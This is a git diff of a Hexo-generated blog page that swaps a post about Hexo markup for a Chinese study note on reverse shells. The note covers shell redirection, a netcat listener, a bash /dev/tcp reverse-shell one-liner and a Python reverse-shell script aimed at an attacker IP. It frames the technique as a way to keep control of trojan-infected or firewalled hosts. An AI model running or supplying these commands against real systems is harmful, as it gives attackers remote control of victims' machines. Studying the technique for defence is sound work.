@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Learning,">
+  <meta name="keywords" content="Learning,Vul,">
 
 
 
@@ -79,20 +79,20 @@
 
 
 
-<meta name="description" content="Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客的首选框架。我的博客便是GitHub+Hexo。">
-<meta name="keywords" content="Learning">
+<meta name="description" content="reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">
+<meta name="keywords" content="Learning,Vul">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hexo grammar Learning">
-<meta property="og:url" content="http://yoursite.com/2019/09/07/Hexo-grammar-Learning/index.html">
+<meta property="og:title" content="反弹SHELL">
+<meta property="og:url" content="http://yoursite.com/2019/10/30/reflect-shell/index.html">
 <meta property="og:site_name" content="DH&#39;s Blog">
-<meta property="og:description" content="Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客的首选框架。我的博客便是GitHub+Hexo。">
+<meta property="og:description" content="reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="https://cdn.pixabay.com/photo/2019/09/13/07/41/sunrise-4473359_1280.jpg">
-<meta property="og:updated_time" content="2019-09-19T03:24:35.521Z">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2016/04/22/08/38/worm-1345354_960_720.jpg">
+<meta property="og:updated_time" content="2019-10-30T08:26:41.485Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo grammar Learning">
-<meta name="twitter:description" content="Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客的首选框架。我的博客便是GitHub+Hexo。">
-<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2019/09/13/07/41/sunrise-4473359_1280.jpg">
+<meta name="twitter:title" content="反弹SHELL">
+<meta name="twitter:description" content="reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2016/04/22/08/38/worm-1345354_960_720.jpg">
 
 
 
@@ -122,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/09/07/Hexo-grammar-Learning/">
+  <link rel="canonical" href="http://yoursite.com/2019/10/30/reflect-shell/">
 
 
 
 
 
-  <title>Hexo grammar Learning | DH's Blog</title>
+  <title>反弹SHELL | DH's Blog</title>
   
 
 
@@ -255,7 +255,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/07/Hexo-grammar-Learning/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/30/reflect-shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="DukeoHu">
@@ -272,7 +272,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Hexo grammar Learning</h1>
+          <h1 class="post-title" itemprop="name headline">反弹SHELL</h1>
         
 
         <div class="post-meta">
@@ -284,8 +284,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-07T23:06:32+08:00">
-                2019-09-07
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-10-30T15:59:08+08:00">
+                2019-10-30
               </time>
             
 
@@ -324,8 +324,8 @@
           
           
             <div class="post-gallery-row">
-              <a class="post-gallery-img fancybox" href="https://cdn.pixabay.com/photo/2019/09/13/07/41/sunrise-4473359_1280.jpg" rel="gallery_ck2d0ud6q0003i4u9bd1zofy9" itemscope itemtype="http://schema.org/ImageObject" itemprop="url">
-                <img src="https://cdn.pixabay.com/photo/2019/09/13/07/41/sunrise-4473359_1280.jpg" itemprop="contentUrl">
+              <a class="post-gallery-img fancybox" href="https://cdn.pixabay.com/photo/2016/04/22/08/38/worm-1345354_960_720.jpg" rel="gallery_ck2d0ud7b000hi4u9xe2vgvcr" itemscope itemtype="http://schema.org/ImageObject" itemprop="url">
+                <img src="https://cdn.pixabay.com/photo/2016/04/22/08/38/worm-1345354_960_720.jpg" itemprop="contentUrl">
               </a>
             
           
@@ -336,55 +336,62 @@
       
 
       
-        <p>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Heroku上，是搭建博客的首选框架。我的博客便是GitHub+Hexo。</p>
+        <p>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
 <a id="more"></a>
-<h2>引用块</h2>
-<p>在文章中插入引言，可包含作者，来源和标题。</p>
-{百分号 blockquote [author[, source]] [link] [source_link_title] 百分号}
-content
-{百分号 endblockquote 百分号}
-<h4>样例:</h4>
-<blockquote><p>Lorem ipsum dolor sit amet, consectetur adipiscing elit.</p>
-<footer><strong>David Smith</strong><cite>China</cite></footer></blockquote>
+
+<h3>文件描述符及重定向</h3>
+<h4>分类</h4>    
+stdin 0：标准输入描述符
+cat 0< text.txt
 <br>
 
-<h2>代码块</h2>
-<p>在文章中插入代码。</p>
-{百分号 codeblock [title] [lang:language] [url] [link text] 百分号}
-code snippet
-{百分号 endcodeblock 百分号}
-<h4>样例:</h4>
-<figure class="highlight python"><figcaption><span>测试代码</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(<span class="string">"Hello,world"</span>)</span><br></pre></td></tr></table></figure>
-<br>
+<p>stdout 1：标准输出描述符<br>echo hello &gt;file<br><br></p>
+<p>stderr 2：标准错误输出描述符<br>mkdir &amp;&gt; text.txt<br><br></p>
+<h4>exec函数</h4>
+绑定文件描述符至指定文件<br>
+Exec 3<>text.txt    //绑定文件描述符3至text.txt文件<br>
+ls >&3            //将ls的结果传送至文件描述符3<br>
+cat text.txt        //查看text.txt的结果发现，成功。
 
-<h2>iframe</h2>
-<p>在文章中插入iframe</p>
-{百分号 iframe url [width] [height] 百分号}
-<h4>样例:</h4>
-<iframe src="https://www.dogedoge.com" width="500" height="200" frameborder="0" allowfullscreen></iframe>
-<br>
 
-<h2>Image图片</h2>
-<p>在文章中插入指定大小的图片</p>
-{百分号 img [class names] /path/to/image [width] [height] "title text 'alt text'" 百分号}"
-<br>
-<h4>样例:</h4>
-<img src="/dukeohu.github.io.jpg" class="img" width="500" height="200" title="github_jpg " alt="test">
-<br>
+<h3>反弹SHELL</h3>
+    适用场景：<br>
+    1.某客户机中了你的木马，但在局域网内，你无法直接连接。<br>
+    2.IP动态变化，不能持续控制。<br>
+    3.防火墙限制，中招机只能发送请求。<br>
 
-<h2>Link</h2>
-<p>在文章中插入链接，并自动给外部链接添加target="_blank"属性。即在新的空白页打开链接。<br>
-{百分号 link text url [external] [title] 百分号}
-</p><h4>样例:</h4>
-<a href="https://www.dogedoge.com" target="_blank" rel="noopener">dog</a>
-<br>
+<h4>概念：</h4>
+攻击者指定服务端，受害者主机主动连接攻击者的服务端程序。
 
-<h2>Include Code</h2>
-<p>插入source/downloads/code文件夹内的代码文件。该路径不是固定的，你可以在站点配置文件中code_dir修改。</p>
-{百分号 include_code [title] [lang:language] paht/to/file 百分号}
+<h4>手法：</h4>
+    1.攻击机：nc –lvp  2333(端口)<br>
+    2.受害机：bash –I >& /dev/tcp/攻击机IP/2333(端口)   0>&1(0<&1也可以)<br>
 
-<h2>文章摘要</h2>
-<p>在文章中使用<!-- more -->，那么该符号之前的文字将被视为摘要，在首页中将只会出现这些文字，但是注意同时正文中也会出现这些文字。</p>
+<h4>解读:</h4>
+    bash –i  ---产生交互式SHELL<br>
+    /dev/tcp/ip/port  ---这个文件十分特殊，可以看成一个设备。访问这个文件时实际是不存在的。但是如果受害机器在攻击方监听这个端口的情况下对这个文件进行读写，就能实现与攻击方的服务器的socket通信
+
+
+<h4>实例：</h4>
+    1.输出字符串到攻击机<br>
+        攻击机：nc –lvp port<br>
+        受害机：echo  hello  > /dev/tcp/ip/port  <br>
+    2.输出字符串到受害机<br>
+        首先攻击机：nc –lvp port<br>
+        其次受害及：cat < /dev/tcp/ip/port<br>
+        然后：攻击机输入字符，并回车。结果就显示过去了。
+
+<h3>高级Python脚本（受害机执行）</h3>
+import os,socket,subprocess<br>
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>
+s.connect(('192.168.98.131', 12345))   #连接到远程攻击主机<br>
+os.dup2(s.fileno(), 0)      #将连接的文件描述符重定向到标准输入stdin<br>
+os.dup2(s.fileno(), 1)      #将连接的文件描述符重定向到标准输出stdout<br>
+os.dup2(s.fileno(), 2)      #将连接的文件描述符重定向到标准错误输出<br>
+p = subprocess.call(['/bin/bash', '-i'])        #调用子进程执行 bash -i<br>
+
+
+</&1也可以)<br>
       
     </div>
     
@@ -403,6 +410,8 @@ code snippet
           
             <a href="/tags/Learning/" rel="tag"># Learning</a>
           
+            <a href="/tags/Vul/" rel="tag"># Vul</a>
+          
         </div>
       
 
@@ -414,8 +423,8 @@ code snippet
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/06/hello-world/" rel="next" title="Hello World">
-                <i class="fa fa-chevron-left"></i> Hello World
+              <a href="/2019/10/30/iis-shortname/" rel="next" title="IIS短文件名泄露漏洞">
+                <i class="fa fa-chevron-left"></i> IIS短文件名泄露漏洞
               </a>
             
           </div>
@@ -424,8 +433,8 @@ code snippet
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/09/11/analysis-vulnerability/" rel="prev" title="PHP伪协议学习笔记">
-                PHP伪协议学习笔记 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/10/30/Sec-Tools/" rel="prev" title="Sec-Tools">
+                Sec-Tools <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -552,7 +561,7 @@ code snippet
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">引用块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.0.1.</span> <span class="nav-text">样例:</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">代码块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.0.1.</span> <span class="nav-text">样例:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">3.</span> <span class="nav-text">iframe</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">3.0.1.</span> <span class="nav-text">样例:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">4.</span> <span class="nav-text">Image图片</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">4.0.1.</span> <span class="nav-text">样例:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">5.</span> <span class="nav-text">Link</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">5.0.1.</span> <span class="nav-text">样例:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">6.</span> <span class="nav-text">Include Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">7.</span> <span class="nav-text">文章摘要</span></a></li></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">文件描述符及重定向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.1.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">1.2.</span> <span class="nav-text">exec函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">2.</span> <span class="nav-text">反弹SHELL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.1.</span> <span class="nav-text">概念：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.2.</span> <span class="nav-text">手法：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.3.</span> <span class="nav-text">解读:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#null"><span class="nav-number">2.4.</span> <span class="nav-text">实例：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#null"><span class="nav-number">3.</span> <span class="nav-text">高级Python脚本（受害机执行）</span></a></li></ol></div>
             
 
           </div>
